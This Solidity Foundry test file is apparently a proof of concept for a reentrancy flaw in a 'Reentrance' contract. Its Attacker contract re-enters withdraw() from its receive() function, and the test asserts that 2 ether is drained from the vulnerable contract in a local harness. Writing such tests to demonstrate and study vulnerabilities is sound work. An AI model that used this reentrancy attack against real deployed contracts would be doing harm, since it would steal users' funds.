// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrance.sol";

contract Attacker {
    Reentrance public target;
    bool private reentrancyGuard;

    constructor(address _target) {
        target = Reentrance(payable(_target));
    }

    // Function to start the attack
    function initiateAttack() public {
        // Trigger the initial withdrawal
        target.withdraw(1 ether);
    }

    // Fallback function to execute reentrancy
    receive() external payable {
        if (!reentrancyGuard) {
            reentrancyGuard = true;
            // Execute second withdrawal before balance update
            target.withdraw(1 ether);
            reentrancyGuard = false;
        }
    }
}

contract ReentranceTest is Test {
    Reentrance public vulnerableContract;
    Attacker public attackerContract;

    function setUp() public {
        // Deploy the vulnerable contract
        vulnerableContract = new Reentrance();
        
        // Deploy the attacker contract
        attackerContract = new Attacker(address(vulnerableContract));
        
        // Fund the vulnerable contract with initial Ether
        vm.deal(address(vulnerableContract), 10 ether);
        
        // Ensure test contract has ETH to donate
        vm.deal(address(this), 1 ether);
        
        // Set up the initial balance for the attacker by donating to their address
        vulnerableContract.donate{value: 1 ether}(address(attackerContract));
    }

    function testReentrancyExploit() public {
        // Pre-attack checks
        uint256 initialAttackBalance = address(attackerContract).balance;
        uint256 initialContractBalance = address(vulnerableContract).balance;
        assertEq(initialAttackBalance, 0, "Attacker initial balance mismatch");
        assertEq(initialContractBalance, 11 ether, "Initial contract balance should be 11 ETH");
        
        // Differential: Log before state
        console.log("--- BEFORE-Trigger Exploit ---");
        uint256 preAttackBalance = address(vulnerableContract).balance;
        console.log("Vulnerable contract balance: %s", preAttackBalance);
        
        console.log("--- Trigger Exploit ---");
        attackerContract.initiateAttack(); // Critical attack action
        
        // Differential: Log after state
        console.log("--- AFTER-Trigger Exploit ---");
        uint256 postAttackBalance = address(vulnerableContract).balance;
        console.log("Vulnerable contract balance: %s", postAttackBalance);
        
        // Differential: Verify state change
        uint256 balanceChange = preAttackBalance - postAttackBalance;
        console.log("Balance change: %s", balanceChange);
        
        // Vulnerability verdict based on balance change
        if (balanceChange == 2 ether) {
            console.log("Vulnerability Exists: Contract lost 2 ether to reentrancy");
        } else {
            console.log("Vulnerability not Exist: Contract lost %s ether, expected 2 ether", balanceChange);
        }
        
        // Original verification (kept for reference)
        uint256 finalAttackBalance = address(attackerContract).balance;
        uint256 finalContractBalance = address(vulnerableContract).balance;
        assertEq(finalAttackBalance, 2 ether, "Attacker should have 2 ETH after attack");
        assertEq(finalContractBalance, 9 ether, "Contract should have 9 ETH remaining");
    }
}